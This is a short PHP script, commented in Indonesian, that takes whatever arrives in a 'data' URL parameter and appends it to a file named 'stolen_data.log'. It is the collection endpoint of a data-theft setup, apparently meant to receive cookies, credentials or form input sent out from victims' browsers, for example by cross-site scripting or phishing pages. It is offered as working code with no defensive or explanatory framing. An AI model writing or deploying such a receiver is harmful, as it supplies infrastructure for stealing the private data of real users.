<?php
// Tangkap data dari parameter 'data' dan simpan ke file log
if (isset($_GET['data'])) {
    $data = $_GET['data'];
    // Simpan data ke file log
    file_put_contents('stolen_data.log', $data . PHP_EOL, FILE_APPEND);
    echo "Data received and logged.";
} else {
    echo "No data received.";
}
?>
